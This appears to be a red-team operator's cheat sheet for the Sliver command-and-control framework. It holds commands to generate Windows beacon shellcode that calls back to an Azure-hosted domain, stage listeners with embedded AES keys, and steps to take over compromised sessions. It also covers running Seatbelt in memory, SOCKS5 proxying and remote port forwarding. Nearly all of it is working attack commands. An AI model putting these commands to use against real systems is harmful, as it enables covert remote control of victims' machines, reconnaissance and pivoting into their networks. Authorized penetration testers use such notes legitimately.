
# Start sliver
$ systemctl status sliver
$ sudo systemctl start sliver
$ sliver


# Start listener
# watch out: if you don't specify beacon, it's gonna be session by default
sliver > profiles new beacon --format shellcode --http https://10.2.1.14 windows-shellcode-https
sliver > https
sliver > stage-listener --url http://10.2.1.14:1234 --profile windows-shellcode-https
sliver > stage-listener --url http://10.2.1.14:1234 --profile win-enc-shellcode-https --aes-encrypt-key 'D(G+KbPeShVmYq3t' --aes-encrypt-iv '8y/B?E(G+KbPeShV'

# OR Generate shellcode for beacon and configure sleep period:
sliver > generate beacon --http https://stmontreal.azurewebsites.net/ --os windows --arch amd64 --format shellcode --sleep 60 --save /var/www/html

sliver > jobs

[*] Session 17c07878 GRIEVING_DRILL - 10.2.1.16:49938 (DESKTOP-6CMQ4H2) - windows/amd64 - Fri, 10 Jan 2025 21:02:39 EST
sliver > use 17c07878
sliver (GRIEVING_DRILL) > ls




sliver (CALM_PLANTER) > interactive
sliver (CALM_PLANTER) > socks5 start
sliver (CALM_PLANTER) > background
sliver > socks5 stop -i 2


#Execute assembly
# Execute seatbelt and save output (-s) to local file
sliver (DIVINE_BUCKET) > execute-assembly -s /mnt/hgfs/missions/Cybershell_STM_RedTeam/Seatbelt/Seatbelt.exe -group=user



#Wireguard profile for stager:
sliver > profiles new --wg 10.2.1.14 --format shellcode wireguard-local-windows
#SOTS Debug profile:
#Attention sous Windows11, le firewall ne laisse pas sortir par defaut sur 4443:
sliver > stage-listener --url https://10.2.1.14:4443 --profile wireguard-local-windows
#SOTS Release profile:
sliver > stage-listener --url https://10.2.1.14:443 --profile wireguard-local-windows



#Remote port forward (no need to be admin)
#might work for HTTP
sliver > rportfwd add --bind 8088 --remote 127.0.0.1:8088
#works with privileged ports too ?!
sliver > rportfwd add --bind 80 --remote 127.0.0.1:8088
#if port is already listening it wont work
sliver > rportfwd add --bind 445 --remote 127.0.0.1:445


